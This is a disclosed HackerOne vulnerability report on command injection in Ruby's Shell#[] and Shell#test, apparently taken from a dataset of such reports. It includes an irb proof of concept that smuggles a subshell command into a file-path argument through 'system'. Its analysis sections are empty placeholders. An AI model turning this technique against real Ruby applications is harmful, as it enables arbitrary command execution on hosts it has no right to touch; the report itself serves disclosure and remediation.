---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '327512'
original_report_id: '327512'
title: Potential command injection in `Shell#[]` and `Shell#test`
weakness: Command Injection - Generic
team_handle: ruby
created_at: '2018-03-19T20:33:10.989Z'
disclosed_at: '2019-10-16T23:15:28.407Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- command-injection-generic
---

# Potential command injection in `Shell#[]` and `Shell#test`

## Metadata

- HackerOne Report ID: 327512
- Weakness: Command Injection - Generic
- Program: ruby
- Disclosed At: 2019-10-16T23:15:28.407Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

As `Shell#test` and `Shell#[]` use `send` when transferring to FileTest, private methods etc. can also be called. Therefore, command injection is possible when a crafted value is passed.

```ruby
$ irb
irb(main):001:0> `ls xy`
ls: xy: No such file or directory
=> ""

irb(main):002:0> require 'shell'
=> true
irb(main):003:0> sh = Shell.new
=> #<Shell:0x00007fc0c20f2a78>
irb(main):004:0> sh['system', '$(touch xy)']
sh: /private/tmp/: is a directory
=> false

irb(main):005:0> `ls xy`
=> "xy\n"
```

Since send is executed after the file path is converted to absolute path, it is difficult with `instance_eval` and `open` etc, but you can execute it using a subshell.

## Impact

It seems almost unlikely that user input is given for the purpose, so it probably will not be affected in most cases.
It may be feasible under complex conditions such as combining object injection and other problems.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
